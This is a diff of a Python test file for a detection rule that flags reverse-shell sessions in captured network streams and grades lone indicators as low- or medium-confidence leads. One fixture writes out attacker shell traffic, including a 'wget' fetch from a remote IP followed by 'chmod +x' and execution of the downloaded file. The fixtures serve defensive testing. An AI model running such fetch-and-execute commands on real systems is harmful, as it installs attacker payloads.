@@ -170,7 +170,7 @@ HARD_NEGATIVES = {
 }
 
 
-NEGATIVE_KINDS = {"single_id": ["output:id"], "document": ["banner"]}
+NEGATIVE_KINDS = {"single_id": ["output:id"]}          # one exchange: below the lone-indicator turn floor
 
 
 @pytest.mark.parametrize("name", sorted(HARD_NEGATIVES))
@@ -380,6 +380,7 @@ def stream_event(analysis, *, client=VICTIM, server=ATTACKER, sid="241118-STREAM
                  opened_by=None):
     fields = {"source.ip": client[0], "source.port": client[1], "destination.ip": server[0],
               "destination.port": server[1], "arkime.session_id": sid, "stream.opened_by": opened_by,
+              "stream.turns": analysis.turns,
               "stream.shell.side": analysis.side, "stream.shell.kinds": analysis.kinds or None,
               "stream.shell.indicators": [i.as_dict() for i in analysis.indicators] or None,
               "stream.limits": limits}
@@ -864,3 +865,53 @@ def test_rows_with_unreadable_addresses_make_the_connection_partial(tmp_path, mo
     stray["ip.src"] = ["not-an-address"]
     repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], {KEY: [*rows, stray]})
     _partial(repo, summary, "with holes")
+
+
+
+# ---- a strong indicator stands alone (as a lead) --------------------------------------------------------------
+
+# `/bin/sh` sent back over tcp/4444: its start-up message, then commands with no recognised output and no prompt.
+BANNER_ONLY = [("c2s", b"/bin/sh: 0: can't access tty; job control turned off\n"), ("s2c", b"cd /tmp\n"),
+               ("c2s", b"\n"), ("s2c", b"wget -q http://198.51.100.7/a\n"), ("c2s", b"\n"),
+               ("s2c", b"chmod +x a; ./a &\n"), ("c2s", b"[1] 4242\n")]
+
+
+def test_a_lone_shell_banner_in_a_conversation_is_a_low_confidence_lead():
+    a = _analysis(BANNER_ONLY, VICTIM, ATTACKER)
+    assert a.kinds == ["banner"] and a.side == "client"
+    m = rule(stream_event(a, opened_by="client"))
+    assert len(m) == 1 and m[0].proposed_lane == "lead" and m[0].confidence == "low"
+    assert "a single indicator was seen: a shell start-up message" in m[0].claim
+    assert "is in one respect consistent with an interactive command shell" in m[0].claim
+
+
+def test_a_lone_command_output_is_a_medium_confidence_lead_and_a_lone_prompt_is_nothing():
+    turns = [("s2c", b"id\n"), ("c2s", b"uid=33(www-data) gid=33(www-data)\n"), ("s2c", b"cd /tmp\n"),
+             ("c2s", b"\n"), ("s2c", b"touch x\n"), ("c2s", b"\n")]
+    a = _analysis(turns, VICTIM, ATTACKER)
+    assert a.kinds == ["output:id"]
+    m = rule(stream_event(a, opened_by="client"))
+    assert [(x.proposed_lane, x.confidence) for x in m] == [("lead", "medium")]
+    prompts = []
+    for _ in range(4):
+        prompts += [("s2c", b"www-data@web01:/tmp$ "), ("c2s", b"cd /tmp\n")]
+    lone = _analysis(prompts, OPERATOR, WEB)
+    assert lone.kinds == ["prompt"] and rule(stream_event(lone, client=OPERATOR, server=WEB)) == []
+
+
+def test_a_lone_login_dialogue_is_nothing():
+    turns = [("s2c", b"web01 login: "), ("c2s", b"admin\r\n"), ("s2c", b"Password: "), ("c2s", b"pw\r\n"),
+             ("s2c", b"Login incorrect\r\n"), ("c2s", b"\r\n")]
+    a = _analysis(turns, OPERATOR, WEB)
+    assert a.kinds == ["login_dialogue"] and rule(stream_event(a, client=OPERATOR, server=WEB)) == []
+
+
+def test_an_unanswered_banner_is_not_an_indicator():
+    a = _analysis([("c2s", b"bash: no job control in this shell\n")], VICTIM, ATTACKER)
+    assert a.kinds == []
+
+
+def test_the_stage_publishes_a_lone_banner_as_a_lead(tmp_path, monkeypatch):
+    repo, summary = _stage(tmp_path, monkeypatch, [REV_DOC], {KEY: conversation(BANNER_ONLY, syn="client")})
+    assert [(c["lane"], c["confidence"]) for c in _found(repo)] == [("lead", "low")]
+    assert summary["streams"][TARGET]["single_indicator"] == 0
